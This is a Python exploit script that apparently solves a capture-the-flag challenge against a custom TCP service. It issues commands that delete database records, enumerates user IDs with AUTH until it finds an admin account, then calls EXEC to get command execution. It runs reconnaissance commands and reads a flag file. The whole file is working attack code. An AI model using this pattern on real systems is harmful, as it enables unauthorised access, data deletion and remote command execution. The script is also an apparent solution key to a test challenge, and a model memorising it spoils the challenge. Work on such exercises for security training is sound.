#!/usr/bin/env python3
import os
import re
import socket
import time


def recv_all(sock: socket.socket, timeout: float = 0.5) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(65535)
            if not data:
                break
            chunks.append(data)
            if len(data) < 65535:
                break
    except Exception:
        pass
    return b"".join(chunks)


def send(sock: socket.socket, line: str, delay_s: float = 0.25) -> bytes:
    if not line.endswith("\n"):
        line += "\n"
    sock.sendall(line.encode())
    time.sleep(delay_s)
    return recv_all(sock, 0.8)


def load_ip_port() -> tuple[str, int]:
    ip = None
    port = None
    with open("/workspace/challenges/khp_instance.env", "r", encoding="utf-8") as f:
        for line in f:
            if line.startswith("IP="):
                ip = line.strip().split("=", 1)[1]
            elif line.startswith("PORT="):
                try:
                    port = int(line.strip().split("=", 1)[1])
                except Exception:
                    pass
    if not ip or not port:
        raise SystemExit("Falta IP/PORT en khp_instance.env")
    return ip, port


def main() -> None:
    ip, port = load_ip_port()
    with socket.create_connection((ip, port), timeout=5) as s:
        _ = recv_all(s, 0.3)
        send(s, "RLDB")
        for i in range(1, 11):
            send(s, f"DDKE {i}")
        send(s, "RLDB")
        admin_id = None
        for i in range(1, 21):
            send(s, f"AUTH {i}")
            page = send(s, "GTPR").decode("utf-8", errors="ignore")
            print(f"-- ID {i} --\n{page}")
            # Buscar admin en cualquiera de las líneas
            if re.search(r":admin\b", page):
                admin_id = i
                break
        if admin_id is not None:
            send(s, f"AUTH {admin_id}")
            out = send(s, "EXEC").decode("utf-8", errors="ignore")
            print("== EXEC ==\n" + out)
            for cmd in ["id", "whoami", "uname -a", "pwd", "ls -la", "cat /home/ctf/flag.txt", "cat flag.txt", "exit"]:
                s.sendall((cmd + "\n").encode())
                time.sleep(0.5)
                data = recv_all(s, 1.0)
                try:
                    print(data.decode("utf-8", errors="ignore"))
                except Exception:
                    print(repr(data))


if __name__ == "__main__":
    main()

